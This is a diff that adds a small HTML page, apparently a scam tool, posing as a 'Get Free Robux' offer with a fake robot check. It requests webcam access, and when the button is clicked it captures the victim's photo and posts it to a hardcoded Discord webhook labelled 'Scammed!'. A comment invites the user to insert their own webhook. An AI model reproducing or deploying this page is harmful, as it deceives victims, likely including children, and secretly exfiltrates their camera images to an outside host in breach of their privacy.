@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Камера → Discord</title>
+</head>
+<body>
+  <h2>TheLogger...</h2>
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
+  <br>
+  <button id="snap">Get Free Robux</button>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    // 👉 ВСТАВЬ СВОЙ WEBHOOK URL ТУТ
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1341126415923417160/1MBugwArtglgPFGUtKcga7hsdLAtafh3qmKavgcz0mw6FBoubVVDT3UMvXF07AqbWZ4Q";
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (err) {
+        alert("Allow camera access to priva ther you are not robot!: " + err.message);
+      }
+    }
+    startCamera();
+
+    document.getElementById("snap").onclick = async () => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, "photo.jpg");
+        formData.append("payload_json", JSON.stringify({
+          content: "📸 Scammed!"
+        }));
+
+        try {
+          const res = await fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            body: formData
+          });
+          if (res.ok) {
+            alert("✅ Sigma");
+          } else {
+            alert("❌ Not Sigma: " + res.status);
+          }
+        } catch (e) {
+          alert("Ошибка отправки: " + e.message);
+        }
+      }, "image/jpeg", 0.9);
+    };
+  </script>
+</body>
+</html>
